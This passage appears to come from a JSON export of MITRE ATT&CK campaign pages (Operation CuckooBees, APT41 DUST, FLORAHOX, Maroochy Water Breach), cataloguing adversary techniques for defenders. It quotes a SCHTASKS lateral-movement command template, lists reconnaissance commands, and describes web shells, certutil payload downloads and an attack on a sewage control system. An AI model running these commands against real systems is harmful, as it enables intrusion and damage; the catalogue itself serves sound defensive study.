Enterprise T1057 Process Discovery During Operation CuckooBees, the threat actors used the tasklist command as part of their advanced reconnaissance.[1] Enterprise T1018 Remote System Discovery During Operation CuckooBees, the threat actors used the net view and ping commands as part of their advanced reconnaissance.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.[1] Enterprise T1505 .003 Server Software Component: Web Shell During Operation CuckooBees, the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.[1] Enterprise T1082 System Information Discovery During Operation CuckooBees, the threat actors used the systeminfo command to gather details about a compromised system.[1] Enterprise T1016 System Network Configuration Discovery During Operation CuckooBees, the threat actors used ipconfig, nbtstat, tracert, route print, and cat /etc/hosts commands.[1] Enterprise T1049 System Network Connections Discovery During Operation CuckooBees, the threat actors used the net session, net use, and netstat commands as part of their advanced reconnaissance.[1] Enterprise T1033 System Owner/User Discovery During Operation CuckooBees, the threat actors used the query user and whoami commands as part of their advanced reconnaissance.[1] Enterprise T1007 System Service Discovery During Operation CuckooBees, the threat actors used the net start command as part of their initial reconnaissance.[1] Enterprise T1124 System Time Discovery During Operation CuckooBees, the threat actors used the net time command as part of their advanced reconnaissance.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement.[1] Software ID Name Description S0105 dsquery [1] S0096 Systeminfo [1] References Cybereason Nocturnus. (2022, May 4). Operation CuckooBees: Deep-Dive into Stealthy Winnti Techniques. Retrieved September 22, 2022. "
},
{
"id": 463,
"title": "APT41 DUST, Campaign C0040",
"path": "/campaigns/C0040/index.html",
"content": " APT41 DUST APT41 DUST was conducted by APT41 from 2023 to July 2024 against entities in Europe, Asia, and the Middle East. APT41 DUST targeted sectors such as shipping, logistics, and media for information gathering purposes. APT41 used previously-observed malware such as DUSTPAN as well as newly observed tools such as DUSTTRAP in APT41 DUST.[1] ID: C0040 First Seen: January 2023 [1] Last Seen: June 2024 [1] Version: 1.0 Created: 16 September 2024 Last Modified: 21 September 2024 Version Permalink Live Version Groups ID Name Description G0096 APT41 APT41 DUST was conducted by APT41 from 2023 to July 2024.[1] Techniques Used Domain ID Name Use Enterprise T1583 .007 Acquire Infrastructure: Serverless APT41 DUST used infrastructure hosted behind Cloudflare or utilized Cloudflare Workers for command and control.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT41 DUST used HTTPS for command and control.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT41 DUST used rar to compress data downloaded from internal Oracle databases prior to exfiltration.[1] Enterprise T1119 Automated Collection APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information.[1] Enterprise T1586 .003 Compromise Accounts: Cloud Accounts APT41 DUST used compromised Google Workspace accounts for command and control.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN.[1] Enterprise T1213 Data from Information Repositories APT41 DUST collected data from victim Oracle databases using SQLULDR2.[1] Enterprise T1074 .001 Data Staged: Local Data Staging APT41 DUST involved exporting data from Oracle databases to local CSV files prior to exfiltration.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography APT41 DUST used HTTPS for command and control.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage APT41 DUST exfiltrated collected information to OneDrive.[1] Enterprise T1574 .001 Hijack Execution Flow: DLL APT41 DUST involved the use of DLL search order hijacking to execute DUSTTRAP.[1] APT41 DUST used also DLL side-loading to execute DUSTTRAP via an AhnLab uninstaller.[1] Enterprise T1070 .004 Indicator Removal: File Deletion APT41 DUST deleted various artifacts from victim systems following use.[1] Enterprise T1105 Ingress Tool Transfer APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as w3wp.exe or conn.exe.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File APT41 DUST used encrypted payloads decrypted and executed in memory.[1] Enterprise T1588 .003 Obtain Capabilities: Code Signing Certificates APT41 DUST used stolen code signing certificates to sign DUSTTRAP malware and components.[1] Enterprise T1596 .005 Search Open Technical Databases: Scan Databases APT41 DUST used internet scan data for target development.[1] Enterprise T1593 .002 Search Open Websites/Domains: Search Engines APT41 DUST involved use of search engines to research victim servers.[1] Enterprise T1594 Search Victim-Owned Websites APT41 DUST involved access of external victim websites for target development.[1] Enterprise T1505 .003 Server Software Component: Web Shell APT41 DUST involved use of web shells such as ANTSWORD and BLUEBEAM for persistence.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing APT41 DUST used stolen code signing certificates for DUSTTRAP malware and subsequent payloads.[1] Enterprise T1569 .002 System Services: Service Execution APT41 DUST used Windows services to execute DUSTPAN.[1] Enterprise T1102 Web Service APT41 DUST used compromised Google Workspace accounts for command and control.[1] Software ID Name Description S0160 certutil APT41 DUST used certutil to load and execute DUSTPAN.[1] S0154 Cobalt Strike Cobalt Strike was used during APT41 DUST.[1] S1158 DUSTPAN DUSTPAN was used during APT41 DUST.[1] S1159 DUSTTRAP DUSTTRAP was used during APT41 DUST.[1] References Mike Stokkel et al. (2024, July 18). APT41 Has Arisen From the DUST. Retrieved September 16, 2024. "
},
{
"id": 464,
"title": "FLORAHOX Activity, Campaign C0053",
"path": "/campaigns/C0053/index.html",
"content": " FLORAHOX Activity FLORAHOX Activity is conducted using a hybrid operational relay box (ORB) network, which combines two types of infrastructure: compromised devices and leased Virtual Private Servers (VPS). The compromised devices include end-of-life routers and IoT devices, while VPS space is commercially leased and managed by ORB network administrators. This hybrid ORB network allows adversaries to proxy and obscure malicious traffic, making the source of the traffic more difficult to trace. The FLORAHOX ORB network has been leveraged by multiple cyber threat actors, including China-nexus actors like ZIRCONIUM. These adversaries conduct espionage campaigns through FLORAHOX Activity, relying on the ORB network's ability to funnel traffic through Tor nodes, provisioned VPS servers, and compromised routers to obfuscate malicious traffic.[1] ID: C0053 First Seen: January 2019 [1] Last Seen: May 2024 [1] Version: 1.0 Created: 25 March 2025 Last Modified: 27 March 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server FLORAHOX Activity has used acquired Virtual Private Servers as control systems for the ORB network.[1] Enterprise T1059 Command and Scripting Interpreter FLORAHOX Activity has executed PHP and Shell scripts to identify and infect subsequent routers for the ORB network.[1] .004 Unix Shell FLORAHOX Activity has executed multiple Bash controller scripts to provide command line inputs for FLORAHOX traversal configurations.[1] Enterprise T1584 .008 Compromise Infrastructure: Network Devices FLORAHOX Activity has compromised network routers and IoT devices for the ORB network.[1] Enterprise T1190 Exploit Public-Facing Application FLORAHOX Activity has exploited and infected vulnerable routers to recruit additional network devices into the ORB.[1] Enterprise T1090 .003 Proxy: Multi-hop Proxy FLORAHOX Activity has routed traffic through a customized Tor relay network layer.[1] Software ID Name Description S0183 Tor FLORAHOX Activity has routed traffic through a customized Tor relay network layer.[1] References Raggi, Michael. (2024, May 22). IOC Extinction? China-Nexus Cyber Espionage Actors Use ORB Networks to Raise Cost on Defenders. Retrieved July 8, 2024. "
},
{
"id": 465,
"title": "Maroochy Water Breach, Campaign C0020",
"path": "/campaigns/C0020/index.html",
"content": " Maroochy Water Breach Maroochy Water Breach was an incident in 2000 where an adversary leveraged the local government\u2019s wastewater control system and stolen engineering equipment to disrupt and eventually release 800,000 liters of raw sewage into the local community.[1] ID: C0020 First Seen: February 2000 [1] Last Seen: April 2000 [1] Version: 1.0 Created: 10 March 2023 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use ICS T0878 Alarm Suppression In the Maroochy Water Breach, the adversary suppressed alarm reporting to the central computer.[1] ICS T0879 Damage to Property In the Maroochy Water Breach, the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. This ultimately led to 800,000 liters of raw sewage being spilled out into the community. The raw sewage affected local parks, rivers, and even a local hotel. This resulted in harm to marine life and produced a sickening stench from the community's affected rivers.[1] ICS T0813 Denial of Control In the Maroochy Water Breach, the adversary temporarily shut an investigator out of the network preventing them from issuing any controls.[1] ICS T0815 Denial of View In the Maroochy Water Breach, the adversary temporarily shut an investigator out of the network, preventing them from viewing the state of the system.[1] ICS T0822 External Remote Services In the Maroochy Water Breach, the adversary gained remote computer access to the system over radio.[1] ICS T0838 Modify Alarm Settings In the Maroochy Water Breach, the adversary disabled alarms at four pumping stations, preventing notifications to the central computer.[1] ICS T0836 Modify Parameter In the Maroochy Water Breach, the adversary gained remote computer access to the control system and altered data so that whatever function should have occurred at affected pumping stations did not occur or occurred in a different way. The software program installed in the laptop was one developed for changing configurations in the PDS computers. This ultimately led to 800,000 liters of raw sewage being spilled out into the community.[1] ICS T0848 Rogue Master In the Maroochy Water Breach, the adversary falsified network addresses in order to send false data and instructions to pumping stations.[1] ICS T0856 Spoof Reporting Message In the Maroochy Water Breach, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.[1] ICS T0864 Transient Cyber Asset In the Maroochy Water Breach, the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.[1] ICS T0855 Unauthorized Command Message In the Maroochy Water Breach, the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.[1] ICS T0860 Wireless Compromise In the Maroochy Water Breach, the adversary used a two-way radio to communicate with and set the frequencies of Maroochy Shire's repeater stations.[1] References Marshall Abrams 2008, July 23 Malicious Control System Cyber Security Attack Case Study Maroochy Water Services, Australia Retrieved. 2018/03/27 "
}
]